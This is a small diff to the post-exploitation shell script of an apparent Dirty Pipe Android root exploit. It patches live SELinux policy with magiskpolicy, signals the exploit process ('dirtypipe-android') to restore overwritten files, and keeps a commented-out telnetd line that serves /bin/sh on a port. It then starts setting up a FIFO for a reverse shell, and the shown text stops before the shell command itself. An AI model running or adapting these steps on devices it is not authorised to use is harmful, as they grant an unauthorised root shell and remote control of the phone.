@@ -33,11 +33,14 @@ export ANDROID_I18N_ROOT=/apex/com.android.i18n
 #/data/local/tmp/magiskpolicy --save /data/local/tmp/policy-dump
 /data/local/tmp/magiskpolicy --magisk --live
 
+# Send completion signal to restore files
+killall -s SIGUSR1 dirtypipe-android
+
 # INSECURE
 # /data/local/tmp/busybox telnetd -l /bin/sh -p 10847 &
 
 # Reverse shell: A little safer
-sleep 2
+sleep 1
 FIFO=/data/local/tmp/reverse-fifo
 
 rm -f $FIFO
